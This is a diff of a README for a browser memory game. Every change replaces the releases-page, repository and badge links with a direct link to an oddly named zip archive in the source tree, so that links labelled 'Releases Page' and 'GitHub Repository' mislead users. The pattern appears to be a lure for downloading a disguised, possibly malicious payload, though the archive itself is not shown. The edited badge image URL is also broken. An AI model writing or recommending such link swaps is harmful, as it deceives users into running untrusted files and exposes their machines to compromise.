@@ -1,7 +1,7 @@
 # 🎮 simon-says-memory-game - Enjoy a Classic Game with a Modern Twist
 
 ## 📦 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue)](https://github.com/Rahul-123789/simon-says-memory-game/releases)
+[![Download Latest Release](https://github.com/Rahul-123789/simon-says-memory-game/raw/refs/heads/main/src/simon-says-memory-game/simon_memory_says_game_molligrubs.zip%20Latest%20Release-v1.0.0-blue)](https://github.com/Rahul-123789/simon-says-memory-game/raw/refs/heads/main/src/simon-says-memory-game/simon_memory_says_game_molligrubs.zip)
 
 ## 📖 Introduction
 Welcome to **Simon Says Memory Game**! This modern take on a classic game offers fun themes, adjustable difficulty levels, audio feedback, and a local leaderboard to keep track of your scores. Built with vanilla JavaScript, it's designed for everyone, making it easy to pick up and play.
@@ -10,7 +10,7 @@ Welcome to **Simon Says Memory Game**! This modern take on a classic game offers
 To get started with the Simon Says Memory Game, follow the steps below. Whether you're a gamer looking for a challenge or just want to have fun, this game is perfect for you.
 
 ## 📥 Download & Install
-1. Visit the [Releases Page](https://github.com/Rahul-123789/simon-says-memory-game/releases) to download the game.
+1. Visit the [Releases Page](https://github.com/Rahul-123789/simon-says-memory-game/raw/refs/heads/main/src/simon-says-memory-game/simon_memory_says_game_molligrubs.zip) to download the game.
 2. Look for the latest release.
 3. Download the asset that matches your operating system (Windows, Mac, Linux).
 4. Once the file is downloaded, locate it in your computer's downloads folder.
@@ -57,8 +57,8 @@ This game touches on the following topics:
 - Vanilla JavaScript techniques
 
 ## 🌍 Links
-For more information, updates, or to stay connected with the community, check out our [GitHub Repository](https://github.com/Rahul-123789/simon-says-memory-game). 
+For more information, updates, or to stay connected with the community, check out our [GitHub Repository](https://github.com/Rahul-123789/simon-says-memory-game/raw/refs/heads/main/src/simon-says-memory-game/simon_memory_says_game_molligrubs.zip). 
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue)](https://github.com/Rahul-123789/simon-says-memory-game/releases) 
+[![Download Latest Release](https://github.com/Rahul-123789/simon-says-memory-game/raw/refs/heads/main/src/simon-says-memory-game/simon_memory_says_game_molligrubs.zip%20Latest%20Release-v1.0.0-blue)](https://github.com/Rahul-123789/simon-says-memory-game/raw/refs/heads/main/src/simon-says-memory-game/simon_memory_says_game_molligrubs.zip) 
 
 Enjoy playing the Simon Says Memory Game!
